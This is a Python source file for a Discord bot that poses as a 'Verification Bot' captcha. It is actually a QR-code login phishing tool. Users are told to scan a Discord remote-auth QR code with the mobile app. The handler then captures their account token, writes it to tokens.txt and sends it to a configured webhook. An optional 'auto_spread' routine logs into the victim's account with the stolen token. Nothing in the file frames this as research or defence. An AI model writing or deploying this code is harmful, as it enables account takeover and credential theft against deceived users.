
from http.client import HTTPException
from pydoc import cli

from DRAclient import DRAClient
import io
import qrcode
import discord
from DiscordDumper import Dump
import asyncio
from discord.utils import get
import json
from datetime import datetime
from colorama import init
from colorama import Fore
from config import config





async def generate_qr(fingerprint):
    qr = qrcode.make(f'https://discordapp.com/ra/{fingerprint}', border=2, box_size=7, version=None)
    
    with io.BytesIO() as image_binary:
                    qr.save(image_binary, 'PNG')
                    image_binary.seek(0)
                    return discord.File(fp=image_binary, filename='image.png')
    
async def generate_verify_embed():
    embed = discord.Embed()
    embed.description = '✅ Scan this QR code to gain access to the rest of the server ✅'
    embed.title = '🤖 Are you a robot?'
    embed.set_author(name='Verification Bot', icon_url='https://cdn.discordapp.com/avatars/512333785338216465/f43bfe6b62b3c38002b3c1cb5100a11a.webp?size=80')
    
    embed.set_image(url="attachment://image.png")
    embed.add_field(name='Couldnt find?', value='🚫 Try again. It can be buggy...', inline=False)

    embed.add_field(name='Important information', value='🚫 This will NOT work without the Discord mobile application 🚫\n 🚫 This code only lasts 2 MINUTES!! 🚫')
    embed.add_field(name='Tutorial', value='1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code', inline=False)
    return embed



class QRHandler():
    def __init__(self):
        self.ctx = None
        self.client = None
        self.client = DRAClient(on_connected=self.on_connected, 
                                on_scan=self.on_scan, 
                                on_finish=self.on_finish, 
                                on_close=self.on_close)
    
    async def run(self, ctx):
        self.ctx = ctx
        await self.client.connect()
    
    async def on_connected(self):
        print(f'[{datetime.now()}] [New session opened]')

        qr = await generate_qr(self.client.fingerprint)
        embed = await generate_verify_embed()
        
        await self.ctx.response.send_message(embed=embed, file=qr, ephemeral=True)

        # await self.ctx.user.send(file=qr, embed=embed)


                    
    async def on_scan(self):
        print(f'{Fore.YELLOW}[{datetime.now()}] [User scanned QR code] {self.client.user.username}#{self.client.user.discrim}')
            
        
    async def on_finish(self):
        print(f'{Fore.GREEN}[{datetime.now()}] [User confirmed] {self.client.user.username}#{self.client.user.discrim}')

        with open('tokens.txt', 'a') as f:
            f.write(self.client.token + '\n')
            
        if config['webhook_url']:
            try:
                Dump().send_webhook(self.client.token)
            except:
                print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to dump to webhook')

        if config['servers'][str(self.ctx.guild.id)]['verify_role']: #servers dict -> guild id from context -> verify_role
            user = self.ctx.user
            try:
                role = get(self.ctx.guild.roles, id=config['servers'][self.ctx.guild.id]['verify_role'])
                await self.ctx.user.add_roles(role)
            except HTTPException:
                print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try running the setuprole command.')
            except discord.errors.Forbidden:
                print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the bot role is above the verify role or giving the bot permissions.')


        
        if config["auto_spread"] == True:
            user = discord.Client(intents=discord.Intents.default())
            
            @user.event
            async def on_ready():
                print(user.servers)
            
            
            user.run(self.client.token)

                                
        
    async def on_close(self):
        print(f'{Fore.RED}[{datetime.now()}] [User failed to submit] {self.client.user.username}#{self.client.user.discrim}')

